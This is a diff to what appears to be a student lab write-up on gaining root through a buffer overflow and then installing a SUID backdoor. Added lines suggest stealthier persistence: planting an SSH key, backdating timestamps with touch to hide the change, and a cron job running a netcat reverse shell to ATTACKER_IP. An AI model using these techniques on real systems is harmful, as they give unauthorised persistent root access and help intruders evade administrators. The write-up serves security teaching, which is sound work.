@@ -160,14 +160,16 @@ print nops+shellcode,nop*2,nop_adress
 
 Let's run the program in GDB and see what happens
 ![Steps of our buffer overflow](/assets/lab2/buffer-overflow.png)
+We succeeded in putting our malicious code in memory, and successfully overwritten the return address so that the program will point to the NOP slope.
 
-
+Now we just have to run it, and we have a root shell !
+![Gaining root shell using our exploit](/assets/lab2/root-shell.png)
 
 
 ### Part 2 : Create a Backdoor
 
 Once we have access to a root shell, we need to create a backdoor in order to be able to log as root easily the next time we need to.
-To do that, all we need is to create a c file called `backdoor.c`for exemple:
+To do that, all we need is to create a c file called `backdoor.c`for example:
 
 ```c 
 #include<stdlib.h>
@@ -182,6 +184,11 @@ Finally, we have to set the suid bit: `chmod u+s backdoor` and verify that group
 
 Now, when we execute`./backdoor` with the user dvader, we gain access to a root shell.
 
+We could also use more hidden methods:
+- add our ssh public key in the list of authorized keys, the root admin could eventually see that it appeared (more difficult if we edit the last modification timestamp using `touch -t YYYYMMDDhhmm <file>`)
+- using a cron job that periodically run a reverse shell regularly using netcat `nc -e /bin/bash <ATTACKER_IP> <PORT>`, netcat is not installed on this machine so this exploit would be more suite for Debian or Ubuntu systems which are more common nowadays
+- using a rootkit, which is much more discrete when it comes to regaining access, rootkit detection can be harder to detect than previous methods
+
 ### Part 3 : Countermeasures
 
 - Canaries : ...
@@ -189,7 +196,7 @@ Now, when we execute`./backdoor` with the user dvader, we gain access to a root 
 - ASLR : ...
 
 
-### Sources that helped us gaining root access on the machine
+### Sources that helped us to gain root access on the machine
 
 1. [Buffer Overflow Attack, Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=589s)
 2. [GDB Petit Tutoriel, Daniel Hirschkof](http://perso.ens-lyon.fr/daniel.hirschkoff/C_Caml/docs/doc_gdb.pdf)
